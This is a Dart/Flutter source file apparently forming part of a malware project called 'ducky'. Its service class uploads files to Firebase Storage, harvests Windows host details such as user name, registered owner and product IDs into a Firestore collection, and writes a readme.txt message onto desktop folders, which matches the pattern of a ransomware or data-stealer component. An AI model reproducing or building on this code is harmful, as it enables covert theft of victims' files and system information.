
import 'dart:io';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:ducky/constants/constants_string.dart';
import 'package:ducky/utils/utils.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';

class DuckServices {
  FirebaseFirestore firestore = FirebaseFirestore.instance;
  final FirebaseStorage storage = FirebaseStorage.instance;

  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

  Future<void> uploadFile({
    required String user,
    required String title,
    required File file,
  }) async {
    try {
      String ref = 'files/${title}__$user-${Utils.randomNumber}';
      await storage.ref(ref).putFile(file);
    } on FirebaseException catch (err) {
      throw Exception(err.code);
    }
  }

  String _replace(String hash) {
    String newHash1 = hash.replaceAll('{', '');
    return newHash1.replaceAll('}', '');
  }

  Future<void> sendInfoFirebase(BuildContext context) async {
    WindowsDeviceInfo windowsInfo = await deviceInfo.windowsInfo;

    Map<String, dynamic> data = windowsInfo.data;

    String replaced = _replace(data['deviceId'].toString());

    var get = await firestore.collection('info').get();

    for (var element in get.docs) {
      String deviceId = element['deviceId'].toString();

      if (deviceId == replaced) break;

      await firestore.collection('info').doc('${Utils.randomNumber}').set({
        'time': Utils.getTime,
        'computerName': data['computerName'],
        'systemMemoryInMegabytes': data['systemMemoryInMegabytes'],
        'userName': data['userName'],
        'digitalProductId': data['digitalProductId'],
        'displayVersion': data['displayVersion'],
        'installDate': data['installDate'],
        'productId': data['productId'],
        'productName': data['productName'],
        'registeredOwner': data['registeredOwner'],
        'releaseId': data['releaseId'],
        'deviceId': replaced,
      });
    }
  }

  Future<void> createReadmeFileInDesktop() async {
    final Directory? downloadDirectory = await getDownloadsDirectory();

    if (downloadDirectory != null) {
      List<FileSystemEntity> parent = downloadDirectory.parent.listSync();

      for (FileSystemEntity item in parent) {
        String path = item.absolute.path;
        String pathLower = path.toLowerCase();

        if (pathLower.contains('desktop')) {
          final File file = File('$path/readme.txt');
          await file.writeAsString(reflectionMsg);
        }
      }
    }
  }
}
